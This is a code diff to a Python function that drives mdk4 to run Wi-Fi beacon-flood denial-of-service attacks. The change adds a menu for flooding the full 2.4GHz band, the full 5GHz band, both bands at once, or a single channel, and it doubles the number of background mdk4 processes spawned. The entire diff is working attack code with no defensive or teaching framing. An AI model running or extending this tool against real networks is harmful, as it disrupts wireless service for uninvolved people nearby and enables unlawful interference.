@@ -45,27 +45,47 @@ def Beacon_Prompt():
 	52, 56, 60, 64,						# UNII-2 (Middle Band)
 	100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,	# UNII-2 Extended
 	149, 153, 157, 161, 165]				# UNII-3 (High Band)
-	bfType = input("Enter Target Channel for single channel flood, bg for 2.4GHz band flood, or a for 5GHz band flood: ")
+	bfType = input("""
+a.   Full 5GHz band
+bg.  Full 2.4GHz band
+abg. Full band attack of both 2.4GHz and 5GHz
+#.   Attack specificed channel (if 2.4GHz or 5GHz channel)
+q.   Quit
+Enter selected target for beacon flood DoS attack: """)
 	if bfType.casefold() == "bg".casefold():
-		for chanIndex in range(990):
+		print("Started attack on 2.4GHz band")
+		for chanIndex in range(1980):
 			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
 			subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%11]} > /dev/null &", shell=True, executable="/bin/bash")
 		exit = input('Input anything to end attack: ')
 		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
-		print("Ended attack on 2.4GHz Band")
+		print("Ended attack on 2.4GHz band")
 		return False
 	if bfType.casefold() == "a".casefold():
-		for chanIndex in range(1000):
+		print("Started attack on 5GHz band")
+		for chanIndex in range(2000):
 			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
 			subprocess.run(f"mdk4 wlan0 b -c {channel_list[11+chanIndex%25]} > /dev/null &", shell=True, executable="/bin/bash")
 		exit = input('Input anything to end attack: ')
 		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
-		print("Ended attack on 5GHz Band")
+		print("Ended attack on 5GHz band")
+		return False
+	if bfType.casefold() == "abg".casefold():
+		print("Started attack on both 2.4GHz and 5GHz bands")
+		for chanIndex in range(2160):
+			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
+			subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%36]} > /dev/null &", shell=True, executable="/bin/bash")
+		exit = input('Input anything to end attack: ')
+		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
+		print("Ended attack on 2.4GHZ and 5GHz bands")
+		return False
+	if bfType.casefold() == "q".casefold():
 		return False
 	try:
 		channel = int(bfType)
 		if channel in channel_list:
-			for i in range(1000):
+			print(f"Started attack on channel {channel}")
+			for i in range(2000):
 				subprocess.run(f"mdk4 wlan0 b -c {channel} > /dev/null &", shell=True, executable="/bin/bash")
 			exit = input('Input anything to end attack: ')
 			subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
